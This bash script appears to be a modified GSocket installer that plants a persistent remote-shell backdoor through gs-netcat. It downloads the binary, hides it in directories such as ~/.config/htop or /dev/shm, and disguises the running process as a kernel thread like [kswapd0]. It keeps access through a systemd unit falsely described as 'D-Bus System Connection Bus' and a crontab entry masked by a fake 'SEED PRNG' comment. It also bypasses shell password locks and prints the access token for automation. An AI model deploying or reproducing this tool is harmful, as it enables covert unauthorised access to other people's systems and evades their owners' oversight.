#! /usr/bin/env bash
# ======================================================================
# GSocket Universal Installer - Modified from gsocket.io/x
# ======================================================================
# Changes:
# 1. FreeBSD support - use correct binary from GitHub
# 2. Bypass .bashrc password lock with -e /bin/bash --noprofile --norc
# 3. Use static Alpine binary for Linux to avoid library issues
# 4. Simplify download (direct binary, no tar)
# 5. Output only token for easy automation
# ======================================================================

set -e

# ----------------------------------------------------------------------
# Global Config
# ----------------------------------------------------------------------
URL_BASE_CDN="https://github.com/hackerschoice/gsocket/releases/download/v1.4.42dev2"
URL_BASE_X="https://gsocket.io"
URL_BIN="${URL_BASE_CDN}"
URL_BIN_FULL="${URL_BASE_CDN}"
URL_DEPLOY="${URL_BASE_X}/y"

# Colors (if terminal)
[[ -t 1 ]] && {
    CY="\033[1;33m"
    CDY="\033[0;33m"
    CG="\033[1;32m"
    CR="\033[1;31m"
    CDR="\033[0;31m"
    CB="\033[1;34m"
    CC="\033[1;36m"
    CDC="\033[0;36m"
    CM="\033[1;35m"
    CN="\033[0m"
    CW="\033[1;37m"
}

# ----------------------------------------------------------------------
# Helper Functions
# ----------------------------------------------------------------------
DEBUGF(){ [[ -n "$GS_DEBUG" ]] && echo -e "${CY}DEBUG:${CN} $*"; }
OK_OUT(){ echo -e "......[${CG}OK${CN}]"; }
FAIL_OUT(){ echo -e "..[${CR}FAILED${CN}]"; for str in "$@"; do echo -e "--> $str"; done; }
WARN(){ echo -e "--> ${CY}WARNING: ${CN}$*"; }
SKIP_OUT(){ echo -e "[${CY}SKIPPING${CN}]"; [[ -n "$1" ]] && echo -e "--> $*"; }

errexit() {
    [[ -z "$1" ]] || echo -e >&2 "${CR}$*${CN}"
    exit 255
}

clean_all() {
    [[ -n "$TMPDIR" && "${#TMPDIR}" -gt 5 ]] && rm -rf "${TMPDIR:?}/"* 2>/dev/null && rmdir "$TMPDIR" 2>/dev/null
    true
}

exit_code() {
    clean_all
    exit "$1"
}

# ----------------------------------------------------------------------
# Timestamp utils (kept for compatibility)
# ----------------------------------------------------------------------
_ts_fix() { true; }
ts_restore() { true; }
ts_add_systemd() { true; }
mk_file() { touch "$1" 2>/dev/null || return; chmod 600 "$1" 2>/dev/null || return; }
xmkdir() { mkdir -p "$1" 2>/dev/null; }
xcp() { cp "$1" "$2" 2>/dev/null; }
xmv() { mv "$1" "$2" 2>/dev/null; }
xrm() { rm -f "$1" 2>/dev/null; }
xrmdir() { rmdir "$1" 2>/dev/null; }

# ----------------------------------------------------------------------
# OS Detection (Enhanced)
# ----------------------------------------------------------------------
detect_os_arch() {
    local os=$(uname -s | tr '[:upper:]' '[:lower:]')
    local arch=$(uname -m)
    DEBUGF "Detected OS=$os ARCH=$arch"

    case "$os" in
        linux)
            case "$arch" in
                x86_64)  OSARCH="linux-x86_64"; SRC_PKG="gs-netcat_linux-x86_64"; SRC_PKG_STATIC="gs-netcat_linux-x86_64-alpine" ;;
                aarch64) OSARCH="linux-aarch64"; SRC_PKG="gs-netcat_linux-arm64"; SRC_PKG_STATIC="gs-netcat_linux-arm64-alpine" ;;
                armv7l)  OSARCH="linux-armv7";   SRC_PKG="gs-netcat_linux-armv7"; SRC_PKG_STATIC="" ;;
                *)       OSARCH="linux-x86_64";  SRC_PKG="gs-netcat_linux-x86_64"; SRC_PKG_STATIC="gs-netcat_linux-x86_64-alpine" ;;
            esac
            OSTYPE="linux-gnu"
            ;;
        freebsd)
            OSARCH="freebsd-x86_64"
            SRC_PKG="gs-netcat_freebsd-x86_64"
            SRC_PKG_STATIC=""
            OSTYPE="FreeBSD"
            ;;
        darwin)
            OSARCH="macos-x86_64"
            SRC_PKG="gs-netcat_macos-x86_64"
            SRC_PKG_STATIC=""
            OSTYPE="darwin22.0"
            ;;
        *)
            echo "Unsupported OS: $os" >&2
            exit 1
            ;;
    esac
    DEBUGF "OSARCH=$OSARCH SRC_PKG=$SRC_PKG"
}
detect_os_arch

# ----------------------------------------------------------------------
# Home & User
# ----------------------------------------------------------------------
if [[ -z "$HOME" ]]; then
    HOME="$(grep ^"$(whoami)" /etc/passwd 2>/dev/null | cut -d: -f6)"
    [[ ! -d "$HOME" ]] && errexit "ERROR: \$HOME not set."
    WARN "HOME not set. Using '$HOME'"
fi
[[ -z "$USER" ]] && USER=$(id -un)
[[ -z "$UID" ]] && UID=$(id -u)

# ----------------------------------------------------------------------
# Download Function (modified for direct binary)
# ----------------------------------------------------------------------
dl() {
    local src="$1"
    local dst="$2"
    local url="${URL_BIN}/${src}"

    [[ -n "$GS_DEBUG" ]] && echo "Downloading $url -> $dst"

    # Try primary
    if curl -fsSL --connect-timeout 10 --retry 2 "$url" -o "$dst" 2>/dev/null; then
        DEBUGF "Download OK"
        return 0
    fi

    # Try static fallback if available
    if [[ -n "$SRC_PKG_STATIC" && "$src" != "$SRC_PKG_STATIC" ]]; then
        DEBUGF "Primary failed, trying static: $SRC_PKG_STATIC"
        if curl -fsSL --connect-timeout 10 --retry 2 "${URL_BIN}/${SRC_PKG_STATIC}" -o "$dst" 2>/dev/null; then
            DEBUGF "Static download OK"
            return 0
        fi
    fi

    return 1
}

# ----------------------------------------------------------------------
# Test Binary
# ----------------------------------------------------------------------
test_bin() {
    local bin="$1"
    unset IS_TESTBIN_OK
    unset ERR_LOG

    DEBUGF "Testing binary: $bin"
    GS_OUT=$("$bin" -g 2>&1 || true)
    local ret=$?
    if [[ $ret -ne 0 ]]; then
        ERR_LOG="$GS_OUT"
        DEBUGF "Binary test failed: ret=$ret, output=$GS_OUT"
        return
    fi

    [[ -z $GS_SECRET ]] && GS_SECRET="$GS_OUT"
    IS_TESTBIN_OK=1
    DEBUGF "Binary test OK, secret: $GS_SECRET"
}

# ----------------------------------------------------------------------
# Try installation
# ----------------------------------------------------------------------
try() {
    local osarch="$1"
    local src_pkg="$2"
    local tmpdir="${TMPDIR:-/tmp}/gs-${UID}"
    mkdir -p "$tmpdir"

    echo -e "--> Trying ${CG}${osarch}${CN}"
    echo -en "Downloading binary.................................................."

    if ! dl "$src_pkg" "${tmpdir}/gs-netcat"; then
        FAIL_OUT "Download failed"
        return 1
    fi
    OK_OUT

    echo -en "Copying binary......................................................"
    xmv "${tmpdir}/gs-netcat" "$DSTBIN" || { FAIL_OUT "Copy failed"; return 1; }
    chmod 700 "$DSTBIN"
    OK_OUT

    echo -en "Testing binary......................................................"
    test_bin "$DSTBIN"
    if [[ -n "$IS_TESTBIN_OK" ]]; then
        OK_OUT
        return 0
    fi
    FAIL_OUT "Binary test failed"
    return 1
}

# ----------------------------------------------------------------------
# Find writable directory
# ----------------------------------------------------------------------
try_dstdir() {
    local dstdir="$1"
    [[ ! -d "$dstdir" ]] && mkdir -p "$dstdir" 2>/dev/null || return 1
    [[ ! -w "$dstdir" ]] && return 1
    [[ ! -x "$dstdir" ]] && return 1

    DSTBIN="${dstdir}/gs-netcat"
    mk_file "$DSTBIN" || return 1
    return 0
}

init_dstbin() {
    if [[ -n "$GS_DSTDIR" ]]; then
        try_dstdir "${GS_DSTDIR}" && return
        errexit "FAILED: GS_DSTDIR=${GS_DSTDIR} is not writable."
    fi

    # Try system
    try_dstdir "/usr/bin" && return
    try_dstdir "/usr/local/bin" && return

    # Try user
    try_dstdir "${HOME}/.config/htop" && return
    try_dstdir "${HOME}/.local/bin" && return

    # Try /tmp
    try_dstdir "/tmp/.gsusr-${UID}" && { IS_DSTBIN_TMP=1; return; }
    try_dstdir "/dev/shm" && { IS_DSTBIN_TMP=1; return; }

    # Try current dir
    try_dstdir "$PWD" && { IS_DSTBIN_CWD=1; return; }

    errexit "No writable directory found."
}

# ----------------------------------------------------------------------
# Setup
# ----------------------------------------------------------------------
BIN_HIDDEN_NAME_DEFAULT="defunct"
proc_name_arr=("[kstrp]" "[watchdogd]" "[ksmd]" "[kswapd0]" "[card0-crtc8]" "[mm_percpu_wq]" "[rcu_preempt]" "[kworker]" "[raid5wq]" "[slub_flushwq]" "[netns]" "[kaluad]")
PROC_HIDDEN_NAME_DEFAULT="${proc_name_arr[$((RANDOM % ${#proc_name_arr[@]}))]}"
BIN_HIDDEN_NAME="${GS_HIDDEN_NAME:-$BIN_HIDDEN_NAME_DEFAULT}"
PROC_HIDDEN_NAME="${GS_HIDDEN_NAME:-$PROC_HIDDEN_NAME_DEFAULT}"
SEC_NAME="${BIN_HIDDEN_NAME}.dat"
CONFIG_DIR_NAME="htop"

[[ -z "$TMPDIR" ]] && TMPDIR="/tmp"

init_dstbin

USER_SEC_FILE="$(dirname "$DSTBIN")/${SEC_NAME}"
NOTE_DONOTREMOVE="# DO NOT REMOVE THIS LINE. SEED PRNG. #${BIN_HIDDEN_NAME}-kernel"

# ----------------------------------------------------------------------
# Secret handling
# ----------------------------------------------------------------------
GS_SECRET=""
GS_SECRET_X=""

gs_secret_reload() {
    [[ -n "$GS_SECRET_FROM_FILE" ]] && return
    [[ ! -f "$1" ]] && return
    local sec=$(<"$1")
    [[ ${#sec} -lt 4 ]] && return
    WARN "Using existing secret from '$1'"
    GS_SECRET_FROM_FILE="$sec"
}

gs_secret_write() {
    mk_file "$1" || return
    echo "$GS_SECRET" > "$1"
}

# ----------------------------------------------------------------------
# Systemd service (modified with -e bypass)
# ----------------------------------------------------------------------
SERVICE_DIR="${HOME}/.config/systemd/user"
SERVICE_FILE="${SERVICE_DIR}/${BIN_HIDDEN_NAME}.service"
SYSTEMD_SEC_FILE="${SERVICE_DIR}/${SEC_NAME}"
WANTS_DIR="${SERVICE_DIR}"

install_system_systemd() {
    [[ ! -d "$SERVICE_DIR" ]] && mkdir -p "$SERVICE_DIR"
    command -v systemctl >/dev/null || return
    if systemctl --user --no-pager status 2>/dev/null | grep -q "State:"; then
        IS_SYSTEMD=1
    else
        return
    fi

    if [[ -f "$SERVICE_FILE" ]]; then
        ((IS_INSTALLED+=1))
        IS_SKIPPED=1
        SKIP_OUT "$SERVICE_FILE already exists."
        return
    fi

    mk_file "$SERVICE_FILE" || return
    chmod 644 "$SERVICE_FILE"

    cat > "$SERVICE_FILE" << EOF
[Unit]
Description=D-Bus System Connection Bus
After=network.target

[Service]
Type=simple
Restart=always
RestartSec=60
WorkingDirectory=$HOME
Environment="GS_ARGS=-k $SYSTEMD_SEC_FILE -ilq -e /bin/bash --noprofile --norc"
ExecStart=/bin/bash -c "exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}'"

[Install]
WantedBy=default.target
EOF

    gs_secret_write "$SYSTEMD_SEC_FILE"
    systemctl --user daemon-reload 2>/dev/null
    systemctl --user enable "${BIN_HIDDEN_NAME}.service" 2>/dev/null || true
    systemctl --user start "${BIN_HIDDEN_NAME}.service" 2>/dev/null || true

    IS_SYSTEMD=1
    ((IS_INSTALLED+=1))
}

# ----------------------------------------------------------------------
# Cron job (modified with -e bypass)
# ----------------------------------------------------------------------
CRONTAB_LINE="GS_ARGS=\"-k ${USER_SEC_FILE} -liq -e /bin/bash --noprofile --norc\" exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}'"

install_user_crontab() {
    command -v crontab >/dev/null || return
    echo -en "Installing access via crontab........................................."
    if crontab -l 2>/dev/null | grep -F -- "${BIN_HIDDEN_NAME}" &>/dev/null; then
        ((IS_INSTALLED+=1))
        IS_SKIPPED=1
        SKIP_OUT "Already installed in crontab."
        return
    fi

    local old
    old="$(crontab -l 2>/dev/null)" || crontab - </dev/null &>/dev/null
    [[ -n $old ]] && old+=$'\n'

    echo -e "${old}${NOTE_DONOTREMOVE}\n* * * * * cd $HOME && SHELL=/bin/bash ${CRONTAB_LINE} >/dev/null 2>&1" | crontab - 2>/dev/null || { FAIL_OUT; return; }

    ((IS_INSTALLED+=1))
    OK_OUT
}

# ----------------------------------------------------------------------
# Start gs-netcat (modified with -e bypass)
# ----------------------------------------------------------------------
gs_start() {
    if [[ -n "$IS_SYSTEMD" ]]; then
        if systemctl --user is-active "${BIN_HIDDEN_NAME}.service" 2>/dev/null; then
            SKIP_OUT "'${BIN_HIDDEN_NAME}' already running as systemd."
            return
        fi
        systemctl --user start "${BIN_HIDDEN_NAME}.service" 2>/dev/null && return
    fi

    # Manual start
    echo -en "Starting '${BIN_HIDDEN_NAME}' as '${PROC_HIDDEN_NAME}'............."
    cd "$HOME"
    GS_ARGS="-k ${USER_SEC_FILE} -liqD -e /bin/bash --noprofile --norc" \
    exec -a "$PROC_HIDDEN_NAME" "$DSTBIN" >/dev/null 2>&1 &
    sleep 2
    OK_OUT
}

# ----------------------------------------------------------------------
# Webhooks (kept but disabled by default)
# ----------------------------------------------------------------------
webhooks() { :; }

# ----------------------------------------------------------------------
# Uninstall
# ----------------------------------------------------------------------
uninstall() {
    echo "Removing ${BIN_HIDDEN_NAME}..."
    xrm "$DSTBIN"
    xrm "$USER_SEC_FILE"
    xrm "$SERVICE_FILE"
    xrm "${SERVICE_DIR}/${SEC_NAME}"
    crontab -l 2>/dev/null | grep -v "$BIN_HIDDEN_NAME" | crontab - 2>/dev/null || true
    if command -v systemctl >/dev/null; then
        systemctl --user stop "${BIN_HIDDEN_NAME}.service" 2>/dev/null || true
        systemctl --user disable "${BIN_HIDDEN_NAME}.service" 2>/dev/null || true
    fi
    echo -e "${CG}Uninstall complete.${CN}"
    exit 0
}

# ----------------------------------------------------------------------
# Main
# ----------------------------------------------------------------------
[[ "$1" =~ (clean|uninstall|clear|undo) ]] && uninstall
[[ -n "$GS_UNDO" || -n "$GS_CLEAN" || -n "$GS_UNINSTALL" ]] && uninstall

# Load existing secret
if [[ -z $S && $UID -eq 0 ]]; then
    gs_secret_reload "$SYSTEMD_SEC_FILE"
fi
gs_secret_reload "$USER_SEC_FILE"

if [[ -n "$GS_SECRET_FROM_FILE" ]]; then
    GS_SECRET="${GS_SECRET_FROM_FILE}"
elif [[ -n "$X" ]]; then
    GS_SECRET="$X"
else
    # Generate new secret
    GS_SECRET=$(openssl rand -hex 20 2>/dev/null || date +%s | sha256sum | head -c 40)
fi

# If S= is set, we are a client connecting, not installing
if [[ -n "$S" ]]; then
    echo -e "Connecting..."
    "${DSTBIN}" -s "$S" -i
    exit $?
fi

# Install
try "$OSARCH" "$SRC_PKG" || errexit "Installation failed."

# Write secret file (if not already from existing)
if [[ -z "$GS_SECRET_FROM_FILE" ]]; then
    gs_secret_write "$USER_SEC_FILE"
fi

[[ -z "$IS_TESTBIN_OK" ]] && errexit "Binary not working."

# Install systemd and/or cron
if [[ -z "$GS_NOINST" ]]; then
    if [[ -n "$IS_DSTBIN_TMP" ]]; then
        WARN "Installed to temp directory ($(dirname "$DSTBIN")). Access may be lost after reboot."
    else
        install_system_systemd
        [[ -z "$IS_INSTALLED" ]] && install_user_crontab
        [[ -z "$IS_INSTALLED" ]] && WARN "No persistence installed (systemd/cron not available)."
    fi
fi

# Start
gs_start

# Webhooks (disabled)
webhooks

# Output secret (for automation)
echo "$GS_SECRET"

exit 0
